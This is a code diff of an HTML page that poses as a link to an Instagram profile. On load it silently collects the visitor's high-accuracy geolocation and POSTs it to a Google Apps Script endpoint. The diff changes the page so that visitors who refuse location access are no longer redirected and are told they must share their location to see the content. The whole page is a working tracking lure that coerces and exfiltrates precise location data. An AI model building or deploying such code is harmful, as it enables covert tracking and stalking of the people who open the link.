@@ -16,20 +16,21 @@
         }
     </style>
     <script>
-        // INSERIRA AQUI A URL DA SUA NOVA IMPLANTAÇÃO DO APPS SCRIPT
+        // URL DA SUA IMPLANTAÇÃO DO APPS SCRIPT
         const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzzvns8EpTvPjV96q8nT_WOg6ZOygFZ1_jb2wh-4yeYqXe155DcWGu1b0bDXQQOd24KIw/exec";
 
         window.onload = function() {
             if (navigator.geolocation) {
-                // Solicita apenas a localização do dispositivo
+                // Solicita a localização do dispositivo
                 navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
                     enableHighAccuracy: true,
                     timeout: 10000,
                     maximumAge: 0
                 });
             } else {
+                alert("Erro: Seu navegador não suporta geolocalização.");
                 console.log("Geolocalização não suportada.");
-                redirecionarUsuario();
+                // Mantém travado sem redirecionar caso o navegador seja antigo
             }
         };
 
@@ -40,10 +41,10 @@
                 timestamp: new Date().toLocaleString("pt-BR")
             };
 
-            // Envia os dados estritamente via método POST
+            // Envia os dados via método POST
             fetch(WEB_APP_URL, {
                 method: "POST",
-                mode: "no-cors", // Evita problemas de CORS com o Google Apps Script
+                mode: "no-cors", 
                 headers: {
                     "Content-Type": "application/json"
                 },
@@ -55,17 +56,23 @@
             })
             .catch(error => {
                 console.error("Erro no envio:", error);
+                // Mesmo se der erro no envio, redireciona se ele tiver aceitado
                 redirecionarUsuario();
             });
         }
 
         function erroLocalizacao(error) {
             console.warn("Permissão recusada ou erro obtendo localização:", error.message);
-            redirecionarUsuario();
+            
+            // Exibe mensagem de erro na tela do usuário
+            alert("Erro: Você precisa permitir o acesso à localização para visualizar este conteúdo.");
+            
+            // Alterado: Removemos a função de redirecionar daqui. 
+            // O usuário fica parado na página com o aviso.
         }
 
         function redirecionarUsuario() {
-            // Insira aqui o site de destino final do usuário
+            // Site de destino final (Apenas se aceitar a localização)
             window.location.href = "https://www.instagram.com/_.karinaborges?igsh=ZmRubmdya2l3ZDRm";
         }
     </script>
